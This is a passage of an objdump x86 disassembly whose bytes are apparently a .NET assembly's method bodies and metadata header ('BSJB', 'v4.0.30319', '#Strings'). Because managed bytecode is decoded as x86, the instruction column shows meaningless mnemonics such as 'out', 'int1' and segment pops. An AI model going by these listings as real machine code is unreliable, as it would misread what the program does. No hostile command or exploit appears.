  4040e6:	00 08                	add    %cl,(%eax)
  4040e8:	18 6f db             	sbb    %ch,-0x25(%edi)
  4040eb:	00 00                	add    %al,(%eax)
  4040ed:	0a 00                	or     (%eax),%al
  4040ef:	08 02                	or     %al,(%edx)
  4040f1:	7b 26                	jnp    0x404119
  4040f3:	00 00                	add    %al,(%eax)
  4040f5:	04 6f                	add    $0x6f,%al
  4040f7:	dc 00                	faddl  (%eax)
  4040f9:	00 0a                	add    %cl,(%edx)
  4040fb:	00 02                	add    %al,(%edx)
  4040fd:	7b 27                	jnp    0x404126
  4040ff:	00 00                	add    %al,(%eax)
  404101:	04 73                	add    $0x73,%al
  404103:	e2 00                	loop   0x404105
  404105:	00 0a                	add    %cl,(%edx)
  404107:	13 04 00             	adc    (%eax,%eax,1),%eax
  40410a:	11 04 07             	adc    %eax,(%edi,%eax,1)
  40410d:	6f                   	outsl  %ds:(%esi),(%dx)
  40410e:	e3 00                	jecxz  0x404110
  404110:	00 0a                	add    %cl,(%edx)
  404112:	1f                   	pop    %ds
  404113:	20 07                	and    %al,(%edi)
  404115:	6f                   	outsl  %ds:(%esi),(%dx)
  404116:	e3 00                	jecxz  0x404118
  404118:	00 0a                	add    %cl,(%edx)
  40411a:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40411d:	20 59 6f             	and    %bl,0x6f(%ecx)
  404120:	e4 00                	in     $0x0,%al
  404122:	00 0a                	add    %cl,(%edx)
  404124:	13 05 1f 20 8d 59    	adc    0x598d201f,%eax
  40412a:	00 00                	add    %al,(%eax)
  40412c:	01 13                	add    %edx,(%ebx)
  40412e:	06                   	push   %es
  40412f:	07                   	pop    %es
  404130:	11 06                	adc    %eax,(%esi)
  404132:	16                   	push   %ss
  404133:	11 06                	adc    %eax,(%esi)
  404135:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404138:	41                   	inc    %ecx
  404139:	00 00                	add    %al,(%eax)
  40413b:	0a 26                	or     (%esi),%ah
  40413d:	02 11                	add    (%ecx),%dl
  40413f:	05 11 06 28 51       	add    $0x51280611,%eax
  404144:	00 00                	add    %al,(%eax)
  404146:	06                   	push   %es
  404147:	16                   	push   %ss
  404148:	fe 01                	incb   (%ecx)
  40414a:	13 07                	adc    (%edi),%eax
  40414c:	11 07                	adc    %eax,(%edi)
  40414e:	2c 0b                	sub    $0xb,%al
  404150:	72 cb                	jb     0x40411d
  404152:	07                   	pop    %es
  404153:	00 70 73             	add    %dh,0x73(%eax)
  404156:	e6 00                	out    %al,$0x0
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	7a 00                	jp     0x40415c
  40415c:	de 0d 11 04 2c 08    	fimuls 0x82c0411
  404162:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404165:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40416a:	dc 1f                	fcompl (%edi)
  40416c:	10 8d 59 00 00 01    	adc    %cl,0x1000059(%ebp)
  404172:	0d 07 09 16 1f       	or     $0x1f160907,%eax
  404177:	10 6f 41             	adc    %ch,0x41(%edi)
  40417a:	00 00                	add    %al,(%eax)
  40417c:	0a 26                	or     (%esi),%ah
  40417e:	08 09                	or     %cl,(%ecx)
  404180:	6f                   	outsl  %ds:(%esi),(%dx)
  404181:	e7 00                	out    %eax,$0x0
  404183:	00 0a                	add    %cl,(%edx)
  404185:	00 07                	add    %al,(%edi)
  404187:	08 6f e8             	or     %ch,-0x18(%edi)
  40418a:	00 00                	add    %al,(%eax)
  40418c:	0a 16                	or     (%esi),%dl
  40418e:	73 df                	jae    0x40416f
  404190:	00 00                	add    %al,(%eax)
  404192:	0a 13                	or     (%ebx),%dl
  404194:	08 00                	or     %al,(%eax)
  404196:	07                   	pop    %es
  404197:	6f                   	outsl  %ds:(%esi),(%dx)
  404198:	e9 00 00 0a 1f       	jmp    0x1f4a419d
  40419d:	10 6a 59             	adc    %ch,0x59(%edx)
  4041a0:	17                   	pop    %ss
  4041a1:	6a 58                	push   $0x58
  4041a3:	d4 8d                	aam    $0x8d
  4041a5:	59                   	pop    %ecx
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	01 13                	add    %edx,(%ebx)
  4041aa:	09 11                	or     %edx,(%ecx)
  4041ac:	08 11                	or     %dl,(%ecx)
  4041ae:	09 16                	or     %edx,(%esi)
  4041b0:	11 09                	adc    %ecx,(%ecx)
  4041b2:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041b5:	41                   	inc    %ecx
  4041b6:	00 00                	add    %al,(%eax)
  4041b8:	0a 8d 59 00 00 01    	or     0x1000059(%ebp),%cl
  4041be:	13 0a                	adc    (%edx),%ecx
  4041c0:	11 09                	adc    %ecx,(%ecx)
  4041c2:	16                   	push   %ss
  4041c3:	11 0a                	adc    %ecx,(%edx)
  4041c5:	16                   	push   %ss
  4041c6:	11 0a                	adc    %ecx,(%edx)
  4041c8:	8e 69 28             	mov    0x28(%ecx),%gs
  4041cb:	ea 00 00 0a 00 11 0a 	ljmp   $0xa11,$0xa0000
  4041d2:	13 0b                	adc    (%ebx),%ecx
  4041d4:	de 23                	fisubs (%ebx)
  4041d6:	11 08                	adc    %ecx,(%eax)
  4041d8:	2c 08                	sub    $0x8,%al
  4041da:	11 08                	adc    %ecx,(%eax)
  4041dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4041dd:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4041e2:	dc 08                	fmull  (%eax)
  4041e4:	2c 07                	sub    $0x7,%al
  4041e6:	08 6f 2d             	or     %ch,0x2d(%edi)
  4041e9:	00 00                	add    %al,(%eax)
  4041eb:	0a 00                	or     (%eax),%al
  4041ed:	dc 07                	faddl  (%edi)
  4041ef:	2c 07                	sub    $0x7,%al
  4041f1:	07                   	pop    %es
  4041f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f3:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4041f8:	dc 11                	fcoml  (%ecx)
  4041fa:	0b 2a                	or     (%edx),%ebp
  4041fc:	41                   	inc    %ecx
  4041fd:	64 00 00             	add    %al,%fs:(%eax)
  404200:	02 00                	add    (%eax),%al
  404202:	00 00                	add    %al,(%eax)
  404204:	65 00 00             	add    %al,%gs:(%eax)
  404207:	00 55 00             	add    %dl,0x0(%ebp)
  40420a:	00 00                	add    %al,(%eax)
  40420c:	ba 00 00 00 0d       	mov    $0xd000000,%edx
  404211:	00 00                	add    %al,(%eax)
  404213:	00 00                	add    %al,(%eax)
  404215:	00 00                	add    %al,(%eax)
  404217:	00 02                	add    %al,(%edx)
  404219:	00 00                	add    %al,(%eax)
  40421b:	00 f1                	add    %dh,%cl
  40421d:	00 00                	add    %al,(%eax)
  40421f:	00 41 00             	add    %al,0x0(%ecx)
  404222:	00 00                	add    %al,(%eax)
  404224:	32 01                	xor    (%ecx),%al
  404226:	00 00                	add    %al,(%eax)
  404228:	0d 00 00 00 00       	or     $0x0,%eax
  40422d:	00 00                	add    %al,(%eax)
  40422f:	00 02                	add    %al,(%edx)
  404231:	00 00                	add    %al,(%eax)
  404233:	00 22                	add    %ah,(%edx)
  404235:	00 00                	add    %al,(%eax)
  404237:	00 1d 01 00 00 3f    	add    %bl,0x3f000001
  40423d:	01 00                	add    %eax,(%eax)
  40423f:	00 0b                	add    %cl,(%ebx)
  404241:	00 00                	add    %al,(%eax)
  404243:	00 00                	add    %al,(%eax)
  404245:	00 00                	add    %al,(%eax)
  404247:	00 02                	add    %al,(%edx)
  404249:	00 00                	add    %al,(%eax)
  40424b:	00 1b                	add    %bl,(%ebx)
  40424d:	00 00                	add    %al,(%eax)
  40424f:	00 2f                	add    %ch,(%edi)
  404251:	01 00                	add    %eax,(%eax)
  404253:	00 4a 01             	add    %cl,0x1(%edx)
  404256:	00 00                	add    %al,(%eax)
  404258:	0b 00                	or     (%eax),%eax
  40425a:	00 00                	add    %al,(%eax)
  40425c:	00 00                	add    %al,(%eax)
  40425e:	00 00                	add    %al,(%eax)
  404260:	13 30                	adc    (%eax),%esi
  404262:	03 00                	add    (%eax),%eax
  404264:	30 00                	xor    %al,(%eax)
  404266:	00 00                	add    %al,(%eax)
  404268:	1c 00                	sbb    $0x0,%al
  40426a:	00 11                	add    %dl,(%ecx)
  40426c:	00 17                	add    %dl,(%edi)
  40426e:	0a 16                	or     (%esi),%dl
  404270:	0b 2b                	or     (%ebx),%ebp
  404272:	17                   	pop    %ss
  404273:	00 03                	add    %al,(%ebx)
  404275:	07                   	pop    %es
  404276:	91                   	xchg   %eax,%ecx
  404277:	04 07                	add    $0x7,%al
  404279:	91                   	xchg   %eax,%ecx
  40427a:	fe 01                	incb   (%ecx)
  40427c:	16                   	push   %ss
  40427d:	fe 01                	incb   (%ecx)
  40427f:	0c 08                	or     $0x8,%al
  404281:	2c 02                	sub    $0x2,%al
  404283:	16                   	push   %ss
  404284:	0a 00                	or     (%eax),%al
  404286:	07                   	pop    %es
  404287:	17                   	pop    %ss
  404288:	58                   	pop    %eax
  404289:	0b 07                	or     (%edi),%eax
  40428b:	03 8e 69 fe 04 0d    	add    0xd04fe69(%esi),%ecx
  404291:	09 2d df 06 13 04    	or     %ebp,0x41306df
  404297:	2b 00                	sub    (%eax),%eax
  404299:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  40429c:	62 1f                	bound  %ebx,(%edi)
  40429e:	20 8d 59 00 00 01    	and    %cl,0x1000059(%ebp)
  4042a4:	25 d0 29 00 00       	and    $0x29d0,%eax
  4042a9:	04 28                	add    $0x28,%al
  4042ab:	eb 00                	jmp    0x4042ad
  4042ad:	00 0a                	add    %cl,(%edx)
  4042af:	80 28 00             	subb   $0x0,(%eax)
  4042b2:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4042b5:	00 00                	add    %al,(%eax)
  4042b7:	00 1b                	add    %bl,(%ebx)
  4042b9:	30 03                	xor    %al,(%ebx)
  4042bb:	00 70 00             	add    %dh,0x0(%eax)
  4042be:	00 00                	add    %al,(%eax)
  4042c0:	1d 00 00 11 00       	sbb    $0x110000,%eax
  4042c5:	28 17                	sub    %dl,(%edi)
  4042c7:	00 00                	add    %al,(%eax)
  4042c9:	0a 02                	or     (%edx),%al
  4042cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4042cc:	18 00                	sbb    %al,(%eax)
  4042ce:	00 0a                	add    %cl,(%edx)
  4042d0:	0a 73 ec             	or     -0x14(%ebx),%dh
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	0a 0c 00             	or     (%eax,%eax,1),%cl
  4042d8:	08 06                	or     %al,(%esi)
  4042da:	6f                   	outsl  %ds:(%esi),(%dx)
  4042db:	90                   	nop
  4042dc:	00 00                	add    %al,(%eax)
  4042de:	0a 0a                	or     (%edx),%cl
  4042e0:	00 de                	add    %bl,%dh
  4042e2:	0b 08                	or     (%eax),%ecx
  4042e4:	2c 07                	sub    $0x7,%al
  4042e6:	08 6f 2d             	or     %ch,0x2d(%edi)
  4042e9:	00 00                	add    %al,(%eax)
  4042eb:	0a 00                	or     (%eax),%al
  4042ed:	dc 73 91             	fdivl  -0x6f(%ebx)
  4042f0:	00 00                	add    %al,(%eax)
  4042f2:	0a 0b                	or     (%ebx),%cl
  4042f4:	00 06                	add    %al,(%esi)
  4042f6:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4042fb:	1f                   	pop    %ds
  4042fc:	09 11                	or     %edx,(%ecx)
  4042fe:	04 91                	add    $0x91,%al
  404300:	13 05 07 12 05 72    	adc    0x72051207,%eax
  404306:	21 08                	and    %ecx,(%eax)
  404308:	00 70 28             	add    %dh,0x28(%eax)
  40430b:	92                   	xchg   %eax,%edx
  40430c:	00 00                	add    %al,(%eax)
  40430e:	0a 6f 93             	or     -0x6d(%edi),%ch
  404311:	00 00                	add    %al,(%eax)
  404313:	0a 26                	or     (%esi),%ah
  404315:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404318:	58                   	pop    %eax
  404319:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40431c:	04 09                	add    $0x9,%al
  40431e:	8e 69 32             	mov    0x32(%ecx),%gs
  404321:	da 07                	fiaddl (%edi)
  404323:	6f                   	outsl  %ds:(%esi),(%dx)
  404324:	33 00                	xor    (%eax),%eax
  404326:	00 0a                	add    %cl,(%edx)
  404328:	6f                   	outsl  %ds:(%esi),(%dx)
  404329:	95                   	xchg   %eax,%ebp
  40432a:	00 00                	add    %al,(%eax)
  40432c:	0a 13                	or     (%ebx),%dl
  40432e:	06                   	push   %es
  40432f:	2b 00                	sub    (%eax),%eax
  404331:	11 06                	adc    %eax,(%esi)
  404333:	2a 01                	sub    (%ecx),%al
  404335:	10 00                	adc    %al,(%eax)
  404337:	00 02                	add    %al,(%edx)
  404339:	00 13                	add    %dl,(%ebx)
  40433b:	00 0c 1f             	add    %cl,(%edi,%ebx,1)
  40433e:	00 0b                	add    %cl,(%ebx)
  404340:	00 00                	add    %al,(%eax)
  404342:	00 00                	add    %al,(%eax)
  404344:	1b 30                	sbb    (%eax),%esi
  404346:	02 00                	add    (%eax),%al
  404348:	1f                   	pop    %ds
  404349:	00 00                	add    %al,(%eax)
  40434b:	00 1e                	add    %bl,(%esi)
  40434d:	00 00                	add    %al,(%eax)
  40434f:	11 00                	adc    %eax,(%eax)
  404351:	73 ec                	jae    0x40433f
  404353:	00 00                	add    %al,(%eax)
  404355:	0a 0a                	or     (%edx),%cl
  404357:	00 06                	add    %al,(%esi)
  404359:	02 6f 90             	add    -0x70(%edi),%ch
  40435c:	00 00                	add    %al,(%eax)
  40435e:	0a 0b                	or     (%ebx),%cl
  404360:	de 0b                	fimuls (%ebx)
  404362:	06                   	push   %es
  404363:	2c 07                	sub    $0x7,%al
  404365:	06                   	push   %es
  404366:	6f                   	outsl  %ds:(%esi),(%dx)
  404367:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40436c:	dc 07                	faddl  (%edi)
  40436e:	2a 00                	sub    (%eax),%al
  404370:	01 10                	add    %edx,(%eax)
  404372:	00 00                	add    %al,(%eax)
  404374:	02 00                	add    (%eax),%al
  404376:	07                   	pop    %es
  404377:	00 0b                	add    %cl,(%ebx)
  404379:	12 00                	adc    (%eax),%al
  40437b:	0b 00                	or     (%eax),%eax
  40437d:	00 00                	add    %al,(%eax)
  40437f:	00 42 53             	add    %al,0x53(%edx)
  404382:	4a                   	dec    %edx
  404383:	42                   	inc    %edx
  404384:	01 00                	add    %eax,(%eax)
  404386:	01 00                	add    %eax,(%eax)
  404388:	00 00                	add    %al,(%eax)
  40438a:	00 00                	add    %al,(%eax)
  40438c:	0c 00                	or     $0x0,%al
  40438e:	00 00                	add    %al,(%eax)
  404390:	76 34                	jbe    0x4043c6
  404392:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404395:	33 30                	xor    (%eax),%esi
  404397:	33 31                	xor    (%ecx),%esi
  404399:	39 00                	cmp    %eax,(%eax)
  40439b:	00 00                	add    %al,(%eax)
  40439d:	00 05 00 6c 00 00    	add    %al,0x6c00
  4043a3:	00 24 15 00 00 23 7e 	add    %ah,0x7e230000(,%edx,1)
  4043aa:	00 00                	add    %al,(%eax)
  4043ac:	90                   	nop
  4043ad:	15 00 00 e0 18       	adc    $0x18e00000,%eax
  4043b2:	00 00                	add    %al,(%eax)
  4043b4:	23 53 74             	and    0x74(%ebx),%edx
  4043b7:	72 69                	jb     0x404422
  4043b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4043ba:	67 73 00             	addr16 jae 0x4043bd
  4043bd:	00 00                	add    %al,(%eax)
  4043bf:	00 70 2e             	add    %dh,0x2e(%eax)
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	28 08                	sub    %cl,(%eax)
  4043c6:	00 00                	add    %al,(%eax)
  4043c8:	23 55 53             	and    0x53(%ebp),%edx
  4043cb:	00 98 36 00 00 10    	add    %bl,0x10000036(%eax)
  4043d1:	00 00                	add    %al,(%eax)
  4043d3:	00 23                	add    %ah,(%ebx)
  4043d5:	47                   	inc    %edi
  4043d6:	55                   	push   %ebp
  4043d7:	49                   	dec    %ecx
  4043d8:	44                   	inc    %esp
  4043d9:	00 00                	add    %al,(%eax)
  4043db:	00 a8 36 00 00 44    	add    %ch,0x44000036(%eax)
  4043e1:	07                   	pop    %es
  4043e2:	00 00                	add    %al,(%eax)
  4043e4:	23 42 6c             	and    0x6c(%edx),%eax
  4043e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4043e8:	62 00                	bound  %eax,(%eax)
  4043ea:	00 00                	add    %al,(%eax)
  4043ec:	00 00                	add    %al,(%eax)
  4043ee:	00 00                	add    %al,(%eax)
  4043f0:	02 00                	add    (%eax),%al
  4043f2:	00 01                	add    %al,(%ecx)
  4043f4:	57                   	push   %edi
  4043f5:	9d                   	popf
  4043f6:	a2 3d 09 0a 00       	mov    %al,0xa093d
  4043fb:	00 00                	add    %al,(%eax)
  4043fd:	fa                   	cli
  4043fe:	01 33                	add    %esi,(%ebx)
  404400:	00 16                	add    %dl,(%esi)
  404402:	00 00                	add    %al,(%eax)
  404404:	01 00                	add    %eax,(%eax)
  404406:	00 00                	add    %al,(%eax)
  404408:	95                   	xchg   %eax,%ebp
  404409:	00 00                	add    %al,(%eax)
  40440b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40440e:	00 00                	add    %al,(%eax)
  404410:	2e 00 00             	add    %al,%cs:(%eax)
  404413:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  404417:	00 32                	add    %dh,(%edx)
  404419:	00 00                	add    %al,(%eax)
  40441b:	00 ec                	add    %ch,%ah
  40441d:	00 00                	add    %al,(%eax)
  40441f:	00 07                	add    %al,(%edi)
  404421:	00 00                	add    %al,(%eax)
  404423:	00 3a                	add    %bh,(%edx)
  404425:	00 00                	add    %al,(%eax)
  404427:	00 01                	add    %al,(%ecx)
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 1e                	add    %bl,(%esi)
  40442d:	00 00                	add    %al,(%eax)
  40442f:	00 01                	add    %al,(%ecx)
  404431:	00 00                	add    %al,(%eax)
  404433:	00 0b                	add    %cl,(%ebx)
  404435:	00 00                	add    %al,(%eax)
  404437:	00 15 00 00 00 03    	add    %dl,0x3000000
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 06                	add    %al,(%esi)
  404441:	00 00                	add    %al,(%eax)
  404443:	00 06                	add    %al,(%esi)
  404445:	00 00                	add    %al,(%eax)
  404447:	00 01                	add    %al,(%ecx)
  404449:	00 00                	add    %al,(%eax)
  40444b:	00 01                	add    %al,(%ecx)
  40444d:	00 00                	add    %al,(%eax)
  40444f:	00 09                	add    %cl,(%ecx)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 03                	add    %al,(%ebx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 01                	add    %al,(%ecx)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 00                	add    %al,(%eax)
  40445d:	00 4d 09             	add    %cl,0x9(%ebp)
  404460:	01 00                	add    %eax,(%eax)
  404462:	00 00                	add    %al,(%eax)
  404464:	00 00                	add    %al,(%eax)
  404466:	06                   	push   %es
  404467:	00 62 08             	add    %ah,0x8(%edx)
  40446a:	7d 12                	jge    0x40447e
  40446c:	06                   	push   %es
  40446d:	00 cf                	add    %cl,%bh
  40446f:	08 7d 12             	or     %bh,0x12(%ebp)
  404472:	06                   	push   %es
  404473:	00 7b 07             	add    %bh,0x7(%ebx)
  404476:	1f                   	pop    %ds
  404477:	12 0f                	adc    (%edi),%cl
  404479:	00 9d 12 00 00 06    	add    %bl,0x6000012(%ebp)
  40447f:	00 be 07 b3 0e 06    	add    %bh,0x60eb307(%esi)
  404485:	00 45 08             	add    %al,0x8(%ebp)
  404488:	b3 0e                	mov    $0xe,%bl
  40448a:	06                   	push   %es
  40448b:	00 26                	add    %ah,(%esi)
  40448d:	08 b3 0e 06 00 b6    	or     %dh,-0x49fff9f2(%ebx)
  404493:	08 b3 0e 06 00 82    	or     %dh,-0x7dfff9f2(%ebx)
  404499:	08 b3 0e 06 00 9b    	or     %dh,-0x64fff9f2(%ebx)
  40449f:	08 b3 0e 06 00 d5    	or     %dh,-0x2afff9f2(%ebx)
  4044a5:	07                   	pop    %es
  4044a6:	b3 0e                	mov    $0xe,%bl
  4044a8:	06                   	push   %es
  4044a9:	00 aa 07 5e 12 06    	add    %ch,0x6125e07(%edx)
  4044af:	00 09                	add    %cl,(%ecx)
  4044b1:	08 b3 0e 06 00 f0    	or     %dh,-0xffff9f2(%ebx)
  4044b7:	07                   	pop    %es
  4044b8:	5b                   	pop    %ebx
  4044b9:	0a 06                	or     (%esi),%al
  4044bb:	00 3e                	add    %bh,(%esi)
  4044bd:	15 9b 0d 0a 00       	adc    $0xa0d9b,%eax
  4044c2:	77 00                	ja     0x4044c4
  4044c4:	e5 12                	in     $0x12,%eax
  4044c6:	06                   	push   %es
  4044c7:	00 3b                	add    %bh,(%ebx)
  4044c9:	10 35 18 06 00 4e    	adc    %dh,0x4e000618
  4044cf:	0f 9b 0d 06 00 60 07 	setnp  0x7600006
  4044d6:	7d 12                	jge    0x4044ea
  4044d8:	06                   	push   %es
  4044d9:	00 1b                	add    %bl,(%ebx)
  4044db:	07                   	pop    %es
  4044dc:	1f                   	pop    %ds
  4044dd:	12 06                	adc    (%esi),%al
  4044df:	00 8f 07 1f 12 0a    	add    %cl,0xa121f07(%edi)
  4044e5:	00 a4 15 bb 14 0a 00 	add    %ah,0xa14bb(%ebp,%edx,1)
  4044ec:	52                   	push   %edx
  4044ed:	0d ad 18 06 00       	or     $0x618ad,%eax
  4044f2:	3c 11                	cmp    $0x11,%al
  4044f4:	f1                   	int1
  4044f5:	09 0a                	or     %ecx,(%edx)
  4044f7:	00 a6 14 63 15 0a    	add    %ah,0xa156314(%esi)
  4044fd:	00 f7                	add    %dh,%bh
  4044ff:	15 63 15 0a 00       	adc    $0xa1563,%eax
  404504:	91                   	xchg   %eax,%ecx
  404505:	0c 63                	or     $0x63,%al
  404507:	15 06 00 de 06       	adc    $0x6de0006,%eax
  40450c:	e5 12                	in     $0x12,%eax
  40450e:	0a 00                	or     (%eax),%al
  404510:	1c 0e                	sbb    $0xe,%al
  404512:	e5 12                	in     $0x12,%eax
  404514:	0a 00                	or     (%eax),%al
  404516:	6b 14 ad 18 06 00 d9 	imul   $0x15,-0x26fff9e8(,%ebp,4),%edx
  40451d:	15 
  40451e:	9b                   	fwait
  40451f:	0d 06 00 50 02       	or     $0x2500006,%eax
  404524:	f1                   	int1
  404525:	09 06                	or     %eax,(%esi)
  404527:	00 69 0d             	add    %ch,0xd(%ecx)
  40452a:	84 01                	test   %al,(%ecx)
  40452c:	0e                   	push   %cs
  40452d:	00 db                	add    %bl,%bl
  40452f:	0b c0                	or     %eax,%eax
  404531:	0b 06                	or     (%esi),%eax
  404533:	00 70 0f             	add    %dh,0xf(%eax)
  404536:	84 01                	test   %al,(%ecx)
  404538:	06                   	push   %es
  404539:	00 39                	add    %bh,(%ecx)
  40453b:	0d 84 01 0a 00       	or     $0xa0184,%eax
  404540:	9e                   	sahf
  404541:	14 1f                	adc    $0x1f,%al
  404543:	12 0a                	adc    (%edx),%cl
  404545:	00 b2 0f 1f 12 06    	add    %dh,0x6121f0f(%edx)
  40454b:	00 24 18             	add    %ah,(%eax,%ebx,1)
  40454e:	55                   	push   %ebp
  40454f:	00 06                	add    %al,(%esi)
  404551:	00 77 11             	add    %dh,0x11(%edi)
  404554:	84 01                	test   %al,(%ecx)
  404556:	12 00                	adc    (%eax),%al
  404558:	04 11                	add    $0x11,%al
  40455a:	5f                   	pop    %edi
  40455b:	16                   	push   %ss
  40455c:	12 00                	adc    (%eax),%al
  40455e:	df 0e                	fisttps (%esi)
  404560:	5f                   	pop    %edi
  404561:	16                   	push   %ss
  404562:	ab                   	stos   %eax,%es:(%edi)
  404563:	00 b0 11 00 00 12    	add    %dh,0x12000011(%eax)
  404569:	00 20                	add    %ah,(%eax)
  40456b:	15 5f 16 06 00       	adc    $0x6165f,%eax
  404570:	22 10                	and    (%eax),%dl
  404572:	35 18 06 00 6d       	xor    $0x6d000618,%eax
  404577:	10 53 17             	adc    %dl,0x17(%ebx)
  40457a:	06                   	push   %es
  40457b:	00 32                	add    %dh,(%edx)
  40457d:	06                   	push   %es
  40457e:	9b                   	fwait
  40457f:	0d 06 00 2b 00       	or     $0x2b0006,%eax
  404584:	00 02                	add    %al,(%edx)
  404586:	16                   	push   %ss
  404587:	00 58 0f             	add    %bl,0xf(%eax)
  40458a:	44                   	inc    %esp
  40458b:	0a 16                	or     (%esi),%dl
  40458d:	00 0d 15 44 0a 06    	add    %cl,0x60a4415
  404593:	00 aa 17 f1 09 06    	add    %ch,0x609f117(%edx)
  404599:	00 00                	add    %al,(%eax)
  40459b:	0e                   	push   %cs
  40459c:	9b                   	fwait
  40459d:	0d 0a 00 b1 13       	or     $0x13b1000a,%eax
  4045a2:	55                   	push   %ebp
  4045a3:	00 c3                	add    %al,%bl
  4045a5:	00 ce                	add    %cl,%dh
  4045a7:	11 00                	adc    %eax,(%eax)
  4045a9:	00 06                	add    %al,(%esi)
  4045ab:	00 52 18             	add    %dl,0x18(%edx)
  4045ae:	b3 0e                	mov    $0xe,%bl
  4045b0:	06                   	push   %es
  4045b1:	00 a4 06 9b 0d 1a 00 	add    %ah,0x1a0d9b(%esi,%eax,1)
  4045b8:	20 00                	and    %al,(%eax)
  4045ba:	7d 12                	jge    0x4045ce
  4045bc:	1a 00                	sbb    (%eax),%al
  4045be:	01 00                	add    %eax,(%eax)
  4045c0:	9b                   	fwait
  4045c1:	0d 1a 00 51 07       	or     $0x751001a,%eax
  4045c6:	7d 12                	jge    0x4045da
  4045c8:	06                   	push   %es
  4045c9:	00 20                	add    %ah,(%eax)
  4045cb:	13 35 18 1a 00 54    	adc    0x54001a18,%esi
  4045d1:	10 35 18 06 00 5c    	adc    %dh,0x5c000618
  4045d7:	0d 35 18 06 00       	or     $0x61835,%eax
  4045dc:	94                   	xchg   %eax,%esp
  4045dd:	00 35 18 06 00 60    	add    %dh,0x60000618
  4045e3:	02 35 18 06 00 7f    	add    0x7f000618,%dh
  4045e9:	06                   	push   %es
  4045ea:	9b                   	fwait
  4045eb:	0d 06 00 2c 17       	or     $0x172c0006,%eax
  4045f0:	9b                   	fwait
  4045f1:	0d 06 00 71 16       	or     $0x16710006,%eax
  4045f6:	9b                   	fwait
  4045f7:	0d 0a 00 07 18       	or     $0x1807000a,%eax
  4045fc:	e5 12                	in     $0x12,%eax
  4045fe:	06                   	push   %es
  4045ff:	00 c6                	add    %al,%dh
  404601:	0d 35 18 06 00       	or     $0x61835,%eax
  404606:	3b 0a                	cmp    (%edx),%ecx
  404608:	53                   	push   %ebx
  404609:	17                   	pop    %ss
  40460a:	06                   	push   %es
  40460b:	00 c8                	add    %cl,%al
  40460d:	09 35 18 0a 00 5b    	or     %esi,0x5b000a18
  404613:	18 bb 14 0a 00 9e    	sbb    %bh,-0x61fff5ec(%ebx)
  404619:	06                   	push   %es
  40461a:	bb 14 0a 00 89       	mov    $0x89000a14,%ebx
  40461f:	06                   	push   %es
  404620:	bb 14 06 00 d6       	mov    $0xd6000614,%ebx
  404625:	0a 9b 0d 06 00 10    	or     0x1000060d(%ebx),%bl
  40462b:	10 9b 0d 06 00 e8    	adc    %bl,-0x17fff9f3(%ebx)
  404631:	0d 9b 0d 0a 00       	or     $0xa0d9b,%eax
  404636:	2b 14 63             	sub    (%ebx,%eiz,2),%edx
  404639:	15 0a 00 ec 13       	adc    $0x13ec000a,%eax
  40463e:	63 15 06 00 38 14    	arpl   %edx,0x14380006
  404644:	9b                   	fwait
  404645:	0d 06 00 a2 04       	or     $0x4a20006,%eax
  40464a:	9b                   	fwait
  40464b:	0d 0a 00 2c 0b       	or     $0xb2c000a,%eax
  404650:	1f                   	pop    %ds
  404651:	12 0a                	adc    (%edx),%cl
  404653:	00 44 0d bb          	add    %al,-0x45(%ebp,%ecx,1)
  404657:	14 0a                	adc    $0xa,%al
  404659:	00 f1                	add    %dh,%cl
  40465b:	0b ad 18 06 00 6f    	or     0x6f000618(%ebp),%ebp
  404661:	0d 84 01 0a 00       	or     $0xa0184,%eax
  404666:	cb                   	lret
  404667:	16                   	push   %ss
  404668:	63 15 0a 00 c5 0e    	arpl   %edx,0xec5000a
  40466e:	e5 12                	in     $0x12,%eax
  404670:	0a 00                	or     (%eax),%al
  404672:	09 14 94             	or     %edx,(%esp,%edx,4)
  404675:	0e                   	push   %cs
  404676:	06                   	push   %es
  404677:	00 01                	add    %al,(%ecx)
  404679:	09 9b 0d 06 00 15    	or     %ebx,0x1500060d(%ebx)
  40467f:	0c f1                	or     $0xf1,%al
  404681:	09 06                	or     %eax,(%esi)
  404683:	00 e3                	add    %ah,%bl
  404685:	0b 9b 0d 0a 00 b3    	or     -0x4cfff5f3(%ebx),%ebx
  40468b:	0b 9b 0d 0a 00 6f    	or     0x6f000a0d(%ebx),%ebx
  404691:	06                   	push   %es
  404692:	9b                   	fwait
  404693:	0d 06 00 95 11       	or     $0x11950006,%eax
  404698:	9b                   	fwait
  404699:	0d 06 00 8e 00       	or     $0x8e0006,%eax
  40469e:	9b                   	fwait
  40469f:	0d 06 00 13 17       	or     $0x17130006,%eax
  4046a4:	f1                   	int1
  4046a5:	09 06                	or     %eax,(%esi)
  4046a7:	00 f0                	add    %dh,%al
  4046a9:	11 f1                	adc    %esi,%ecx
  4046ab:	09 0a                	or     %ecx,(%edx)
  4046ad:	00 58 04             	add    %bl,0x4(%eax)
  4046b0:	bb 14 06 00 26       	mov    $0x26000614,%ebx
  4046b5:	01 9b 0d 06 00 7b    	add    %ebx,0x7b00060d(%ebx)
